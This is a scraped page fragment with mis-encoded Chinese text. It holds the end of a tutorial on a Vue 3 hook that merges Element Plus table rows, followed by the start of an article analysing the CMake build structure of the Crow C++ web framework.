<span class="hljs-keyword">export</span> <span class="hljs-keyword">function</span> useTableSpan&lt;T = <span class="hljs-title class_">Record</span>&lt;string, any&gt;&gt;(<span class="hljs-attr">spanRule</span>: <span class="hljs-title class_">TableSpanRule</span>) {

    <span class="hljs-keyword">const</span> filterArray = (
        <span class="hljs-attr">currentTable</span>: { <span class="hljs-attr">rule</span>: string[]; <span class="hljs-attr">data</span>: T },
        <span class="hljs-attr">item</span>: T
    ): <span class="hljs-function"><span class="hljs-params">boolean</span> =&gt;</span> {
        <span class="hljs-keyword">const</span> valueArray = currentTable.<span class="hljs-property">rule</span>.<span class="hljs-title function_">filter</span>(<span class="hljs-function">(<span class="hljs-params">prop</span>) =&gt;</span> {
            <span class="hljs-keyword">return</span> item[prop] === currentTable.<span class="hljs-property">data</span>[prop];
        });
        <span class="hljs-keyword">return</span> valueArray.<span class="hljs-property">length</span> === currentTable.<span class="hljs-property">rule</span>.<span class="hljs-property">length</span>;
    };

    <span class="hljs-keyword">const</span> <span class="hljs-title function_">objectSpanMethod</span> = (<span class="hljs-params">
        param: {
            row: T;
            column: T;
            rowIndex: number;
            columnIndex: number;
        },
        tableData: T[]
    </span>) =&gt; {
        <span class="hljs-keyword">const</span> { columnIndex, rowIndex } = param;
        <span class="hljs-comment">// åˆ¤æ–­å½“å‰åˆ—æ˜¯å¦åœ¨åˆå¹¶è§„åˆ™ä¸­</span>
        <span class="hljs-keyword">if</span> (<span class="hljs-title class_">Object</span>.<span class="hljs-title function_">keys</span>(spanRule.<span class="hljs-property">rule</span>).<span class="hljs-title function_">includes</span>(columnIndex.<span class="hljs-title function_">toString</span>())) {
            <span class="hljs-keyword">const</span> currentTable = {
                <span class="hljs-attr">rule</span>: spanRule.<span class="hljs-property">rule</span>[columnIndex],
                <span class="hljs-attr">data</span>: tableData[rowIndex]
            };
            <span class="hljs-keyword">let</span> chooseSpan = <span class="hljs-literal">false</span>;
            <span class="hljs-comment">// éç¬¬ä¸€è¡Œæ—¶éªŒè¯æ˜¯å¦éœ€è¦åˆå¹¶</span>
            <span class="hljs-keyword">if</span> (rowIndex !== <span class="hljs-number">0</span>) {
                chooseSpan = <span class="hljs-title function_">filterArray</span>(currentTable, tableData[rowIndex - <span class="hljs-number">1</span>]);
            }
            <span class="hljs-comment">// éœ€è¦åˆå¹¶åˆ™éšè—å½“å‰å•å…ƒæ ¼ï¼Œå¦åˆ™è®¾ç½®åˆå¹¶è¡Œæ•°</span>
            <span class="hljs-keyword">if</span> (chooseSpan) {
                <span class="hljs-keyword">return</span> {
                    <span class="hljs-attr">rowspan</span>: <span class="hljs-number">0</span>,
                    <span class="hljs-attr">colspan</span>: <span class="hljs-number">0</span>
                };
            } <span class="hljs-keyword">else</span> {
                <span class="hljs-keyword">return</span> {
                    <span class="hljs-attr">rowspan</span>: tableData.<span class="hljs-title function_">filter</span>(<span class="hljs-function">(<span class="hljs-params">i</span>) =&gt;</span> <span class="hljs-title function_">filterArray</span>(currentTable, i)).<span class="hljs-property">length</span>,
                    <span class="hljs-attr">colspan</span>: <span class="hljs-number">1</span>
                };
            }
        }
        <span class="hljs-comment">// éåˆå¹¶åˆ—è¿”å›é»˜è®¤å€¼</span>
        <span class="hljs-keyword">return</span> {
            <span class="hljs-attr">rowspan</span>: <span class="hljs-number">1</span>,
            <span class="hljs-attr">colspan</span>: <span class="hljs-number">1</span>
        };
    };

    <span class="hljs-keyword">return</span> {
        objectSpanMethod
    };
}
</code></pre>
<h3 data-id="heading-3">vue3 è¡¨æ ¼åˆå¹¶</h3>
<pre><code class="hljs language-javascript" lang="javascript">&lt;el-table
      :data=<span class="hljs-string">"tableData"</span>
     :span-method=<span class="hljs-string">"(param)=&gt;objectSpanMethod(param,tableData)"</span> <span class="hljs-comment">//è¿™é‡Œéå¸¸é‡è¦ï¼ŒtableDataå­—æ®µæ˜¯è¡¨æ ¼çš„æ•°æ®</span>
      border
      style=<span class="hljs-string">"width: 100%"</span>&gt;
      <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">el-table-column</span> 
        <span class="hljs-attr">prop</span>=<span class="hljs-string">"day"</span>
        <span class="hljs-attr">label</span>=<span class="hljs-string">"day"</span>
        <span class="hljs-attr">width</span>=<span class="hljs-string">"180"</span>&gt;</span>
      <span class="hljs-tag">&lt;/<span class="hljs-name">el-table-column</span>&gt;</span></span>
      <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">el-table-column</span>
        <span class="hljs-attr">prop</span>=<span class="hljs-string">"domainName"</span>
        <span class="hljs-attr">label</span>=<span class="hljs-string">"domainName"</span>&gt;</span>
      <span class="hljs-tag">&lt;/<span class="hljs-name">el-table-column</span>&gt;</span></span>
      <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">el-table-column</span>
        <span class="hljs-attr">prop</span>=<span class="hljs-string">"allPurchaseCount"</span>
        <span class="hljs-attr">sortable</span>
        <span class="hljs-attr">label</span>=<span class="hljs-string">"allPurchaseCount"</span>&gt;</span>
      <span class="hljs-tag">&lt;/<span class="hljs-name">el-table-column</span>&gt;</span></span>
      <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">el-table-column</span>
        <span class="hljs-attr">prop</span>=<span class="hljs-string">"allPurchaseValue"</span>
        <span class="hljs-attr">sortable</span>
        <span class="hljs-attr">label</span>=<span class="hljs-string">"allPurchaseValue"</span>&gt;</span>
      <span class="hljs-tag">&lt;/<span class="hljs-name">el-table-column</span>&gt;</span></span>
      <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">el-table-column</span>
        <span class="hljs-attr">prop</span>=<span class="hljs-string">"gaAmountUsd"</span>
        <span class="hljs-attr">sortable</span>
        <span class="hljs-attr">label</span>=<span class="hljs-string">"äº¤æ˜“é¢"</span>&gt;</span>
      <span class="hljs-tag">&lt;/<span class="hljs-name">el-table-column</span>&gt;</span></span>
    &lt;/el-table&gt;
<span class="hljs-keyword">const</span> tableCol = [  <span class="hljs-comment">//è¡¨æ ¼åˆ—</span>
  {
    <span class="hljs-attr">label</span>: <span class="hljs-title function_">t</span>(<span class="hljs-string">'localeAudience.datetime'</span>),
    <span class="hljs-attr">prop</span>: <span class="hljs-string">'day'</span>,
    <span class="hljs-attr">width</span>: <span class="hljs-number">120</span>,
    <span class="hljs-attr">sortable</span>: <span class="hljs-string">"custom"</span>,
    <span class="hljs-attr">formatter</span>: <span class="hljs-function">(<span class="hljs-params">row: any, column: any, text: any</span>) =&gt;</span> {
      <span class="hljs-keyword">return</span> text || <span class="hljs-string">"-"</span>;
    },
  },
  {
    <span class="hljs-attr">label</span>: <span class="hljs-title function_">t</span>(<span class="hljs-string">'localeAudience.domain'</span>),
    <span class="hljs-attr">width</span>: <span class="hljs-number">120</span>,
    <span class="hljs-attr">prop</span>: <span class="hljs-string">'domainName'</span>,
    <span class="hljs-string">'show-overflow-tooltip'</span>: <span class="hljs-literal">true</span>,
  },
  {
    <span class="hljs-attr">label</span>: <span class="hljs-title function_">t</span>(<span class="hljs-string">'localeAudience.allorders'</span>),
    <span class="hljs-attr">sortable</span>: <span class="hljs-string">"custom"</span>,
    <span class="hljs-attr">width</span>: <span class="hljs-number">120</span>,
    <span class="hljs-attr">prop</span>: <span class="hljs-string">'allPurchaseCount'</span>,
  },
  {
    <span class="hljs-attr">label</span>: <span class="hljs-title function_">t</span>(<span class="hljs-string">'localeAudience.allamount'</span>),
    <span class="hljs-attr">sortable</span>: <span class="hljs-string">"custom"</span>,
    <span class="hljs-attr">width</span>: <span class="hljs-number">140</span>,
    <span class="hljs-attr">prop</span>: <span class="hljs-string">'allPurchaseValue'</span>,
  },
  {
    <span class="hljs-attr">label</span>: <span class="hljs-string">'äº¤æ˜“é¢'</span>,
    <span class="hljs-attr">sortable</span>: <span class="hljs-string">"custom"</span>,
    <span class="hljs-attr">width</span>: <span class="hljs-number">180</span>,
    <span class="hljs-attr">prop</span>: <span class="hljs-string">'gaAmountUsd'</span>,
  },
];
<span class="hljs-keyword">const</span> tableData = [ <span class="hljs-comment">// 1.è¡¨æ ¼æ•°æ®</span>
  {
    <span class="hljs-attr">day</span>: <span class="hljs-string">'2023-08-01'</span>,
    <span class="hljs-attr">domainName</span>: <span class="hljs-string">'example.com'</span>,
    <span class="hljs-attr">allPurchaseCount</span>: <span class="hljs-number">10</span>,
    <span class="hljs-attr">allPurchaseValue</span>: <span class="hljs-number">1000</span>,
    <span class="hljs-attr">gaAmountUsd</span>: <span class="hljs-number">500</span>,
  },
  {
    <span class="hljs-attr">day</span>: <span class="hljs-string">'2023-08-01'</span>,
    <span class="hljs-attr">domainName</span>: <span class="hljs-string">'example.com'</span>,
    <span class="hljs-attr">allPurchaseCount</span>: <span class="hljs-number">5</span>,
    <span class="hljs-attr">allPurchaseValue</span>: <span class="hljs-number">500</span>,
    <span class="hljs-attr">gaAmountUsd</span>: <span class="hljs-number">250</span>,
  },
  {
    <span class="hljs-attr">day</span>: <span class="hljs-string">'2023-08-02'</span>,
    <span class="hljs-attr">domainName</span>: <span class="hljs-string">'example.com'</span>,
    <span class="hljs-attr">allPurchaseCount</span>: <span class="hljs-number">8</span>,
    <span class="hljs-attr">allPurchaseValue</span>: <span class="hljs-number">800</span>,
    <span class="hljs-attr">gaAmountUsd</span>: <span class="hljs-number">400</span>,
  },
];
<span class="hljs-comment">// 2. å®šä¹‰åˆ—åˆå¹¶è§„åˆ™</span>
<span class="hljs-keyword">const</span> spanRule = {
  <span class="hljs-attr">rule</span>: {
    <span class="hljs-number">0</span>: [<span class="hljs-string">'day'</span>,<span class="hljs-string">'domainName'</span>,<span class="hljs-string">'allPurchaseCount'</span>,<span class="hljs-string">'allPurchaseValue'</span>], <span class="hljs-comment">//è¡¨ç¤ºç¬¬1åˆ—çš„åˆå¹¶è§„åˆ™</span>
    <span class="hljs-number">1</span>: [<span class="hljs-string">'day'</span>,<span class="hljs-string">'domainName'</span>,<span class="hljs-string">'allPurchaseCount'</span>,<span class="hljs-string">'allPurchaseValue'</span>], <span class="hljs-comment">//è¡¨ç¤ºç¬¬2åˆ—çš„åˆå¹¶è§„åˆ™</span>
    <span class="hljs-number">2</span>: [<span class="hljs-string">'day'</span>,<span class="hljs-string">'domainName'</span>,<span class="hljs-string">'allPurchaseCount'</span>,<span class="hljs-string">'allPurchaseValue'</span>], <span class="hljs-comment">//è¡¨ç¤ºç¬¬3åˆ—çš„åˆå¹¶è§„åˆ™</span>
    <span class="hljs-number">3</span>: [<span class="hljs-string">'day'</span>,<span class="hljs-string">'domainName'</span>,<span class="hljs-string">'allPurchaseCount'</span>,<span class="hljs-string">'allPurchaseValue'</span>], <span class="hljs-comment">//è¡¨ç¤ºç¬¬4åˆ—çš„åˆå¹¶è§„åˆ™</span>
  }
};

<span class="hljs-comment">// 3. ä½¿ç”¨è¡¨æ ¼åˆå¹¶Hook</span>
<span class="hljs-keyword">const</span> { objectSpanMethod } = <span class="hljs-title function_">useTableSpan</span>(spanRule);
</code></pre></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Crow é¡¹ç›® CMake ç»“æ„åˆ†æï¼šä¸ºä»€ä¹ˆä¸èƒ½ä» examples ç›®å½•å¼€å§‹æ‰§è¡Œï¼Ÿ]]></title>    <link>https://juejin.cn/post/7596890557546086446</link>    <guid>https://juejin.cn/post/7596890557546086446</guid>    <pubDate>2026-01-19T17:15:47.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7596890557546086446" data-draft-id="7596906923892572170" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Crow é¡¹ç›® CMake ç»“æ„åˆ†æï¼šä¸ºä»€ä¹ˆä¸èƒ½ä» examples ç›®å½•å¼€å§‹æ‰§è¡Œï¼Ÿ"/> <meta itemprop="keywords" content="ç¨‹åºå‘˜"/> <meta itemprop="datePublished" content="2026-01-19T17:15:47.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="è‡ªç”±ç”Ÿé•¿2024"/> <meta itemprop="url" content="https://juejin.cn/user/1591748569862670"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Crow é¡¹ç›® CMake ç»“æ„åˆ†æï¼šä¸ºä»€ä¹ˆä¸èƒ½ä» examples ç›®å½•å¼€å§‹æ‰§è¡Œï¼Ÿ
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1591748569862670/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    è‡ªç”±ç”Ÿé•¿2024
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-19T17:15:47.000Z" title="Mon Jan 19 2026 17:15:47 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-19
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    11
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»20åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>æ‘˜è¦ï¼šCrow é¡¹ç›®é‡‡ç”¨ç°ä»£ CMake ç»“æ„ï¼Œæ ¹ç›®å½•å®šä¹‰äº† INTERFACE åº“ Crow::Crowã€ä¾èµ–æŸ¥æ‰¾åŠå…¨å±€å˜é‡ï¼Œexamples ä½œä¸ºå­ç›®å½•é€šè¿‡ add_subdirectory å¼•å…¥ï¼Œä¾èµ–çˆ¶ç›®å½•çš„ä¸Šä¸‹æ–‡ã€‚è‹¥ä» examples ç›®å½•ç›´æ¥æ‰§è¡Œ CMakeï¼Œå°†å› è·¯å¾„é”™è¯¯ã€ç›®æ ‡æœªå®šä¹‰ã€å˜é‡ç¼ºå¤±è€Œå¤±è´¥ã€‚æ­£ç¡®åšæ³•å§‹ç»ˆä»æ ¹ç›®å½•é…ç½®æ„å»ºã€‚</p>
<h2 data-id="heading-0">Crow é¡¹ç›® CMake ç»“æ„åˆ†æï¼šä¸ºä»€ä¹ˆä¸èƒ½ä» examples ç›®å½•å¼€å§‹æ‰§è¡Œ</h2>
<blockquote>
<p>cmakeé¡¹ç›®åœ°å€ï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2FCrowCpp%2FCrow%2F" target="_blank" title="https://github.com/CrowCpp/Crow/" ref="nofollow noopener noreferrer">CrowCpp/Crow: A Fast and Easy to use microframework for the web.</a></p>
</blockquote>
<h3 data-id="heading-1">æ¦‚è¿°</h3>
<p>Crowé¡¹ç›®æ˜¯ä¸€ä¸ªç±»ä¼¼äºFlaskä½†æ˜¯Cppç‰ˆçš„å¾®å‹Webæ¡†æ¶ã€‚</p>
<p>æœ¬æ–‡æ¡£æ·±å…¥åˆ†æ Crow é¡¹ç›®çš„ CMake æ„å»ºç³»ç»Ÿç»“æ„ï¼Œé‡ç‚¹é˜è¿°æ ¹ç›®å½•å’Œ <code>examples</code> ç›®å½•çš„ CMakeLists.txt æ ¸å¿ƒå†…å®¹ï¼Œå¹¶è§£é‡Šä¸ºä»€ä¹ˆä¸èƒ½ä» <code>examples</code> ç›®å½•ç›´æ¥æ‰§è¡Œ CMake é…ç½®å’Œæ„å»ºã€‚</p>
<h3 data-id="heading-2">ä¸€ã€æ ¹ç›®å½• CMakeLists.txt æ ¸å¿ƒå†…å®¹</h3>
<p>æ ¹ç›®å½•çš„ <code>CMakeLists.txt</code> æ˜¯æ•´ä¸ª Crow é¡¹ç›®çš„æ„å»ºç³»ç»Ÿæ ¸å¿ƒï¼Œå®ƒå®šä¹‰äº†é¡¹ç›®çš„åŸºç¡€è®¾æ–½ã€åº“ç›®æ ‡ã€ä¾èµ–ç®¡ç†å’Œå­é¡¹ç›®é›†æˆã€‚</p>
<h4 data-id="heading-3">1.1 é¡¹ç›®åŸºç¡€é…ç½®</h4>
<pre><code class="hljs language-cmake" lang="cmake">cmake_minimum_required(VERSION 3.15.0 FATAL_ERROR)
project(Crow
    LANGUAGES CXX
    VERSION 1.1.1
)
</code></pre>
<ul>
<li><strong>ä½œç”¨</strong>ï¼šå®šä¹‰é¡¹ç›®åç§°ã€è¯­è¨€å’Œç‰ˆæœ¬</li>
<li><strong>é‡è¦æ€§</strong>ï¼šè¿™æ˜¯æ•´ä¸ª CMake æ„å»ºæ ‘çš„æ ¹ï¼Œæ‰€æœ‰å­ç›®å½•çš„ <code>CMAKE_SOURCE_DIR</code> éƒ½æŒ‡å‘è¿™é‡Œ</li>
</ul>
<h4 data-id="heading-4">1.2 CMake æ¨¡å—è·¯å¾„é…ç½®</h4>
<pre><code class="hljs language-cmake" lang="cmake"># Make sure Findasio.cmake module is found
list(APPEND CMAKE_MODULE_PATH ${CMAKE_CURRENT_SOURCE_DIR}/cmake)
</code></pre>
<ul>
<li><strong>ä½œç”¨</strong>ï¼šå°†é¡¹ç›®æ ¹ç›®å½•ä¸‹çš„ <code>cmake</code> å­ç›®å½•æ·»åŠ åˆ° CMake æ¨¡å—æœç´¢è·¯å¾„</li>
<li><strong>é‡è¦æ€§</strong>ï¼šä½¿å¾— CMake èƒ½å¤Ÿæ‰¾åˆ°é¡¹ç›®è‡ªå®šä¹‰çš„æ¨¡å—ï¼Œå¦‚ <code>Findasio.cmake</code> å’Œ <code>compiler_options.cmake</code></li>
<li><strong>ä¾èµ–å…³ç³»</strong>ï¼š<code>examples/CMakeLists.txt</code> ä¾èµ–è¿™ä¸ªé…ç½®æ¥æ‰¾åˆ° <code>compiler_options.cmake</code></li>
</ul>
<h4 data-id="heading-5">1.3 æ ¸å¿ƒåº“ç›®æ ‡å®šä¹‰</h4>
<pre><code class="hljs language-cmake" lang="cmake">add_library(Crow INTERFACE)
add_library(Crow::Crow ALIAS Crow)

target_include_directories(Crow
    INTERFACE
        $&lt;BUILD_INTERFACE:${CMAKE_CURRENT_SOURCE_DIR}/include&gt;
        $&lt;INSTALL_INTERFACE:include&gt;
)
</code></pre>
<p><strong>å…³é”®ç‚¹åˆ†æ</strong>ï¼š</p>
<ol>
<li>
<p><strong>INTERFACE åº“</strong>ï¼šCrow æ˜¯ä¸€ä¸ª header-only åº“ï¼Œä½¿ç”¨ <code>INTERFACE</code> åº“ç±»å‹ï¼Œè¿™æ„å‘³ç€å®ƒä¸ç¼–è¯‘ä»»ä½•æºæ–‡ä»¶ï¼Œåªæä¾›æ¥å£ï¼ˆå¤´æ–‡ä»¶è·¯å¾„ã€ç¼–è¯‘é€‰é¡¹ã€é“¾æ¥åº“ç­‰ï¼‰</p>
</li>
<li>
<p><strong>åˆ«åç›®æ ‡è¯¦è§£</strong>ï¼š</p>
<pre><code class="hljs language-cmake" lang="cmake">add_library(Crow::Crow ALIAS Crow)
</code></pre>
<p><strong>è¯­æ³•è§£æ</strong>ï¼š</p>
<ul>
<li><code>add_library()</code>ï¼šCMake å‘½ä»¤ï¼Œç”¨äºåˆ›å»ºåº“ç›®æ ‡</li>
<li><code>Crow::Crow</code>ï¼šåˆ«åç›®æ ‡çš„åç§°ï¼ˆå¸¦å‘½åç©ºé—´å‰ç¼€ï¼‰</li>
<li><code>ALIAS</code>ï¼šå…³é”®å­—ï¼Œè¡¨ç¤ºè¿™æ˜¯ä¸€ä¸ªåˆ«åï¼Œä¸æ˜¯çœŸæ­£çš„åº“</li>
<li><code>Crow</code>ï¼šè¢«åˆ«åçš„å®é™…ç›®æ ‡åç§°</li>
</ul>
<p><strong>æ ¸å¿ƒä½œç”¨</strong>ï¼š</p>
<ul>
<li><strong>åŠ å‰ç¼€é˜²æ­¢å¼„æ··</strong>ï¼šä¸º <code>Crow</code> ç›®æ ‡æ·»åŠ  <code>Crow::</code> å‘½åç©ºé—´å‰ç¼€ï¼Œé¿å…ä¸å…¶ä»–åŒåç›®æ ‡å†²çª</li>
<li><code>Crow</code> å’Œ <code>Crow::Crow</code> æŒ‡å‘åŒä¸€ä¸ªç›®æ ‡ï¼Œå¯ä»¥äº’æ¢ä½¿ç”¨</li>
<li>ä¾‹å¦‚ï¼š<code>target_link_libraries(myapp Crow)</code> å’Œ <code>target_link_libraries(myapp Crow::Crow)</code> æ•ˆæœç›¸åŒ</li>
</ul>
<p><strong>ç®€å•ç†è§£</strong>ï¼š</p>
<pre><code class="hljs language-cmake" lang="cmake">add_library(Crow INTERFACE)           # åˆ›å»ºå®é™…ç›®æ ‡ "Crow"
add_library(Crow::Crow ALIAS Crow)    # ç»™ "Crow" åŠ ä¸ªå‰ç¼€ "Crow::"ï¼Œå˜æˆ "Crow::Crow"
</code></pre>
<p>å°±åƒç»™æ–‡ä»¶åŠ ä¸ªæ–‡ä»¶å¤¹å‰ç¼€ä¸€æ ·ï¼š</p>
<ul>
<li><code>Crow</code> â†’ <code>Crow::Crow</code>ï¼ˆåŠ ä¸ªå‘½åç©ºé—´å‰ç¼€ï¼‰</li>
<li>é˜²æ­¢å’Œå…¶ä»–å« <code>Crow</code> çš„ç›®æ ‡å¼„æ··</li>
</ul>
<p><strong>ä¸ºä»€ä¹ˆä¸èƒ½ç›´æ¥åˆ›å»ºå¸¦å‘½åç©ºé—´çš„ç›®æ ‡ï¼Ÿ</strong></p>
<p>ä½ å¯èƒ½ä¼šé—®ï¼šä¸ºä»€ä¹ˆä¸ç›´æ¥å†™ <code>add_library(Crow::Crow INTERFACE)</code> å‘¢ï¼Ÿ</p>
<p><strong>åŸå›  1ï¼šCMake è¯­æ³•é™åˆ¶</strong></p>
<pre><code class="hljs language-cmake" lang="cmake"># âŒ ä¸æ¨èï¼šè™½ç„¶è¯­æ³•ä¸Šå¯ä»¥ï¼Œä½† CMake ä¼šæŠŠ "Crow::Crow" å½“ä½œæ™®é€šç›®æ ‡å
add_library(Crow::Crow INTERFACE)  # è¿™ä¸æ˜¯çœŸæ­£çš„å‘½åç©ºé—´ï¼Œåªæ˜¯åå­—é‡Œå¸¦ "::"

# âœ… æ¨èï¼šå…ˆåˆ›å»ºå®é™…ç›®æ ‡ï¼Œå†ç”¨ ALIAS åˆ›å»ºå‘½åç©ºé—´ç‰ˆæœ¬
add_library(Crow INTERFACE)
add_library(Crow::Crow ALIAS Crow)
</code></pre>
<p><strong>åŸå›  2ï¼šALIAS çš„é™åˆ¶</strong></p>
<p>ALIAS ç›®æ ‡æœ‰ä¸€äº›é™åˆ¶ï¼Œä¸èƒ½åšæŸäº›æ“ä½œï¼š</p>
<ul>
<li>âŒ ä¸èƒ½ä¿®æ”¹å±æ€§ï¼ˆå¦‚ <code>target_include_directories()</code>ï¼‰</li>
<li>âŒ ä¸èƒ½å®‰è£…ï¼ˆ<code>install(TARGETS ...)</code>ï¼‰</li>
<li>âŒ ä¸èƒ½å¯¼å‡ºï¼ˆ<code>install(EXPORT ...)</code>ï¼‰</li>
<li>âœ… åªèƒ½ä½œä¸ºåŸç›®æ ‡çš„å¦ä¸€ä¸ªåå­—</li>
</ul>
<p>æ‰€ä»¥å®é™…çš„åº“é…ç½®å¿…é¡»åœ¨<strong>è£¸åå­—ç›®æ ‡</strong>ä¸Šå®Œæˆï¼š</p>
<pre><code class="hljs language-cmake" lang="cmake">add_library(Crow INTERFACE)  # âœ… å®é™…ç›®æ ‡ï¼Œå¯ä»¥é…ç½®å±æ€§
target_include_directories(Crow INTERFACE ...)  # âœ… åœ¨è£¸åå­—ç›®æ ‡ä¸Šè®¾ç½®
target_link_libraries(Crow INTERFACE ...)       # âœ… åœ¨è£¸åå­—ç›®æ ‡ä¸Šè®¾ç½®

add_library(Crow::Crow ALIAS Crow)  # âœ… åªæ˜¯åˆ«åï¼ŒæŒ‡å‘ä¸Šé¢çš„ Crow
</code></pre>
<p><strong>é‡è¦æ¾„æ¸…ï¼šCMake ä¸ä¼š"éšè—"åŸç›®æ ‡</strong></p>
<p><strong>å¦‚æœé…ç½®æ“ä½œåªèƒ½åœ¨è£¸åå­—ä¸Šå®Œæˆï¼Œé‚£ä¸ä¼šæš´éœ²è£¸åå­—å—ï¼Ÿ</strong></p>
